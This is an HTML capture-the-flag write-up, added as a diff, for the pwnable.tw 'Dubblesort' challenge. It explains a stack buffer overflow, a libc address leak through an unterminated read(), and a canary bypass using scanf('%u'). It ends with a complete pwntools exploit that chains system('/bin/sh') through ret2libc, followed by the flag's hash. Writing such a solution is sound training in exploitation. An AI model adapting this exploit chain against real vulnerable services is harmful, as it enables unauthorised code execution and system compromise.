@@ -1,0 +1,89 @@
+<!--Solve date: 07/05/2022-->
+
+<h1>pwnable.tw - Dubblesort</h1>
+
+<h2>200 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Overview</h5>
+
+<p>This challenge features a 32-bit binary implementing bubblesort. However, instead of allocating space on the heap, the program uses the stack to hold the array to be sorted. There is enough room for <code>8</code> dwords to be stored, but no length checking is performed. As a result, it is possible to overwrite the return pointer and gain arbitrary code execution as long as the values of the payload gadgets are in increasing order (a somewhat annoying constraint but nonetheless one that can be easily satisfied with a short ROP chain).</p>
+
+<h5>Leaking Libc via Uninitialized Stack</h5>
+
+<p>To get the addresses of gadgets to spawn a shell, the libc base address must be leaked. Here, the program offers an easy route in the first part, which requests and then prints the user's name. The problem is that the request uses <code>read()</code> to get the name, which does not null-terminate. As a result, it is possible to leak the contents of the stack. Let's examine what the stack region at the name buffer and the process memory map look like before the name is read:</p>
+
+<img class = "small" src = "./images/pwnable_dubblesort_1.png"/>
+
+<p>When running this, it's important to use the same version of libc as the provided to ensure that the stack layout is the same as on the remote server. It's evident that there are stack pointers into libc. The most readily available one is at the 6th dword offset from the beginning of <code>name</code> (i.e., 24 bytes from the beginning of <code>name</code>), which points to the top of the last page of <code>libc</code>. Writing 24 bytes in addition to a newline <code>\n</code> ensures that the address is printed. The effective offset from the base of libc will be <code>0x1b0000</code> (ignoring the newline character; see payload for implementation).</p>
+
+<h5>Arbitrary Code Execution with a Sequence of Increasing Gadgets</h5>
+
+<p>After obtaining libc, we can submit a simple ROP payload to execute <code>system("/bin/sh");</code>. Since this is a 32-bit binary, all arguments are passed via the stack. We can overwrite the return pointer with <code>system()</code> (libc offset <code>0x3a940</code>), the return's return with a gadget that calls <code>exit()</code> (libc offset <code>0x735ff</code> - note that the <i>argument</i> of the <code>exit()</code> call will be the next item in the stack), and the argument to <code>system()</code> with the address of <code>"/bin/sh"</code> (libc offset <code>0x158e8b</code>). Note that this constitutes an increasing (unsigned) sequence of values, so the rearragement by the sorting operation will have no effect.</p>
+
+<p>The problem remains about the canary, which can not be faithfully leaked. Fortunately, the numbers are read using <code>scanf("%u");</code>, which will not convert the input (i.e., it will leave the specified memory unchanged) if no numerical character is present. So, as long as the canary value is not greater than the gadget addresses, then the payload will be successfully executed.</p>
+
+<p>The number of entries we need corresponds to (going off the offset from the frame pointer) <code>+0x10 - (-0x7c) = 0x8c</code> bytes, or <code>35</code> dwords.</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+
+from pwn import *
+
+#p = process("./dubblesort")
+'''
+gdb.attach(p, gdbscript = """
+
+""")
+'''
+p = remote("chall.pwnable.tw", 10101)
+libc = ELF("./dubblesort_libc.so")
+
+rec = lambda: p.recv()
+recl = lambda: p.recvline()
+sendnl = lambda x: p.send(x)
+sendl = lambda x: p.sendline(x)
+sendnuml = lambda x: p.sendline(bytes(str(x), "utf-8"))
+inter = lambda: p.interactive()
+
+
+offs_ = 0x1b0000
+rec()
+sendl(24 * b'\x01')					#write up to the libc leak
+recl()
+# first byte was overwritten with newline; restore it before calculating offset
+libc.address = u32(b'\x00' + p.recv(3)) - offs_
+log.info("Libc: 0x%x" % (libc.address))
+
+call_exit_ = 0x735ff
+rec()
+sendnuml(35)
+# all the way up to canary
+for _ in range(24):
+    rec()
+    sendnuml(0)						#the lowest unsigned integer
+    
+rec()
+sendl(b'-')							#keep canary as-is (#25)
+
+for _ in range(7):
+    rec()
+    sendnuml(libc.sym["system"] - 1)
+    
+rec()
+sendnuml(libc.sym["system"])		#send system (#33)
+rec()
+sendnuml(libc.address + call_exit_)	#send exit(#34)
+rec()
+sendnuml(next(libc.search(b"/bin/sh")))		#send "/bin/sh" string (#35)
+
+inter()
+</pre>
+
+<h4>Flag (SHA-256)</h4>
+
+<p><code>629cb5cc5bea1cf878dc542b495f633af1ace9898e737f81a76b4484510286c9</code></p>
